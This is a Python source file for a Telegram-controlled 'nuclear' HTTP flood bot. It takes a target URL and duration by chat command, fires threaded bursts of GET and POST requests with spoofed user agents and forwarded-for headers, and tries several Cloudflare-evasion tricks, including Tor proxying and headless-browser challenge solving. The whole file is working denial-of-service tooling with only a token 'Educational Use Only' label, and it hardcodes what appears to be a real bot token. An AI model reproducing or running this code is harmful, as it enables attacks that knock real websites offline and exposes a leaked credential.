import telebot
import requests
import time
import random
import threading
import cloudscraper
from urllib.parse import urlparse
from playwright.sync_api import sync_playwright

# Configuration
TOKEN = '7442456441:AAEFPbQXixXUrP9pcQTCVADQnavkSnkbvDM'
AUTHORIZED_USERS = [6817815128]  # Replace with your ID
MAX_DURATION = 300  # Max attack duration (seconds)
MAX_REQUESTS = 50000  # Max requests (adjust for nuclear mode)
REQUEST_TIMEOUT = 2  # Lower timeout = faster attacks

# User Agents (150+ for maximum diversity)
USER_AGENTS = [
    # Chrome (Windows/Mac/Linux)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    # Firefox (Windows/Mac/Linux)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    # Mobile (Android/iOS)
    'Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    
    # Crawlers (Googlebot, Bingbot)
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    
    # Firefox (Windows/Mac)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:120.0) Gecko/20100101 Firefox/120.0',
    
    # Safari (Mac/iOS)
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPod touch; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
    
    # Edge (Windows/Mac)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0',
    
    # Android Devices
    'Mozilla/5.0 (Linux; Android 13; SM-S901U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    
    # iOS Devices
    'Mozilla/5.0 (iPhone14,6; U; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/602.1',
    'Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/602.1',
    'Mozilla/5.0 (iPhone13,2; U; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/602.1',
    'Mozilla/5.0 (iPad13,8; U; CPU OS 17_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/602.1',
    
    # Linux Browsers
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    
    # Gaming Consoles
    'Mozilla/5.0 (PlayStation 5; PlayStation 5/6.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
    'Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/609.4 (KHTML, like Gecko) NF/6.0.3.15.4 NintendoBrowser/5.1.0.22474',
    'Mozilla/5.0 (PlayStation 4; PlayStation 4/9.00) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    
    # Smart TVs
    'Mozilla/5.0 (Web0S; Linux/SmartTV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36 WebAppManager',
    'Mozilla/5.0 (SMART-TV; LINUX; Tizen 6.0) AppleWebKit/537.36 (KHTML, like Gecko) 85.0.4183.93/6.0 TV Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Mi TV) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.79 Safari/537.36',
    
    # Legacy Browsers (for maximum diversity)
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1',
    
    # Crawlers/Bots (for stealth)
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Twitterbot/1.0',
    'facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)',
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6998.135 Mobile Safari/537.36',
]

# Cloudflare Bypass Engines
scraper = cloudscraper.create_scraper(
    browser={
        'browser': 'chrome',
        'platform': 'windows',
        'mobile': False,
    }
)

# Initialize bot
bot = telebot.TeleBot(TOKEN)
active_attacks = {}

### --- CLOUDFLARE BYPASS METHODS (5+ Techniques) --- ###
def bypass_cloudflare(url):
    """Attempt 5 different bypass methods before giving up"""
    methods = [
        _cf_method_1,  # Standard cloudscraper
        _cf_method_2,  # Header spoofing
        _cf_method_3,  # Real browser (Playwright)
        _cf_method_4,  # HTTPS -> HTTP downgrade
        _cf_method_5,  # Proxy rotation
    ]
    
    for method in methods:
        if method(url):
            return True
    return False

def _cf_method_1(url):
    """Standard cloudscraper bypass"""
    try:
        response = scraper.get(url, timeout=REQUEST_TIMEOUT)
        return response.status_code == 200
    except:
        return False

def _cf_method_2(url):
    """Advanced header spoofing"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.google.com/',
        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
    }
    try:
        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        return response.status_code == 200
    except:
        return False

def _cf_method_3(url):
    """Real browser fallback (Playwright)"""
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            page.goto(url)
            time.sleep(2)  # Wait for JS challenges
            browser.close()
        return True
    except:
        return False

def _cf_method_4(url):
    """HTTPS -> HTTP downgrade (if misconfigured)"""
    if url.startswith('https://'):
        http_url = url.replace('https://', 'http://')
        try:
            response = requests.get(http_url, timeout=REQUEST_TIMEOUT)
            return response.status_code == 200
        except:
            return False
    return False

def _cf_method_5(url):
    """Proxy rotation (TOR/Residential proxies)"""
    proxies = {
        'http': 'socks5://localhost:9050',  # TOR proxy
        'https': 'socks5://localhost:9050'
    }
    try:
        response = requests.get(url, proxies=proxies, timeout=REQUEST_TIMEOUT)
        return response.status_code == 200
    except:
        return False

### --- PROTECTION DETECTION --- ###
def detect_protection(url):
    """Check for Cloudflare, Vercel, etc."""
    try:
        response = requests.get(url, timeout=REQUEST_TIMEOUT)
        headers = response.headers
        
        if "cloudflare" in headers.get("Server", "").lower():
            return "CLOUDFLARE"
        elif "vercel" in headers.get("Server", "").lower():
            return "VERCEL"
        elif "x-vercel-id" in headers:
            return "VERCEL"
        else:
            return "NONE"
    except:
        return "UNKNOWN"

### --- NUCLEAR HTTP FLOOD (GET + POST Mixed) --- ###
def nuclear_flood(target_url):
    """Ultra-fast mixed GET/POST requests with evasion"""
    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': random.choice(['https://google.com', target_url]),
        'X-Requested-With': 'XMLHttpRequest'  # Mimic AJAX
    }
    
    # Randomly choose GET or POST
    if random.random() > 0.5:
        try:
            requests.get(
                target_url,
                headers=headers,
                timeout=REQUEST_TIMEOUT
            )
        except:
            pass
    else:
        try:
            requests.post(
                target_url,
                headers=headers,
                data={'param': random.randint(1, 1000)},  # Fake form data
                timeout=REQUEST_TIMEOUT
            )
        except:
            pass

### --- MAIN ATTACK THREAD (No Delays, Pure Speed) --- ###
def run_attack(target_url, duration, attack_id, chat_id):
    end_time = time.time() + duration
    request_count = 0
    protection = detect_protection(target_url)
    
    bot.send_message(
        chat_id,
        f"🚀 **Nuclear Attack Launched**\n"
        f"🔗 Target: `{target_url}`\n"
        f"⏱️ Duration: `{duration}s`\n"
        f"🛡️ Protection: `{protection}`\n"
        f"⚡ Mode: `Ultra-Fast Mixed GET/POST`"
    )
    
    while time.time() < end_time and active_attacks.get(attack_id, False):
        threads = []
        for _ in range(200):  # 200 threads per burst (adjust for power)
            if request_count >= MAX_REQUESTS:
                break
            
            if protection == "CLOUDFLARE":
                t = threading.Thread(target=bypass_cloudflare, args=(target_url,))
            else:
                t = threading.Thread(target=nuclear_flood, args=(target_url,))
            
            threads.append(t)
            t.start()
            request_count += 1
        
        # No sleep = maximum speed
    
    active_attacks.pop(attack_id, None)
    bot.send_message(
        chat_id,
        f"✅ **Attack Completed**\n"
        f"📊 Total Requests: `{request_count}`\n"
        f"🔥 Requests/Second: `{request_count / duration:.2f}`"
    )

### --- TELEGRAM BOT COMMANDS --- ###
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ **Unauthorized**")
        return
    
    help_text = """
    ☢️ **Nuclear Cloudflare Bypass Bot** (Educational Use Only)
    
    **Commands:**
    `/attack <url> <seconds>` - Launch nuclear attack
    `/stop <attack_id>` - Stop attack
    `/list` - Active attacks
    
    **Features:**
    ✅ 5+ Cloudflare bypass methods
    ✅ Auto-detects Vercel/Cloudflare
    ✅ Ultra-fast mixed GET/POST flood
    ✅ No delays, pure speed
    """
    bot.reply_to(message, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def start_attack(message):
    if message.from_user.id not in AUTHORIZED_USERS:
        bot.reply_to(message, "⛔ **Unauthorized**")
        return
    
    try:
        _, url, duration = message.text.split()
        duration = int(duration)
        
        if not url.startswith(('http://', 'https://')):
            bot.reply_to(message, "⚠️ **Invalid URL** (Include http:// or https://)")
            return
        
        attack_id = str(message.message_id)
        active_attacks[attack_id] = True
        
        thread = threading.Thread(
            target=run_attack,
            args=(url, duration, attack_id, message.chat.id)
        )
        thread.start()
        
        bot.reply_to(message, f"⚡ **Nuclear Attack Started** (ID: `{attack_id}`)")
    except Exception as e:
        bot.reply_to(message, f"❌ **Error:** `{str(e)}`")

if __name__ == '__main__':
    print("☢️ Nuclear Bot Activated. Use /help for commands.")
    bot.infinity_polling()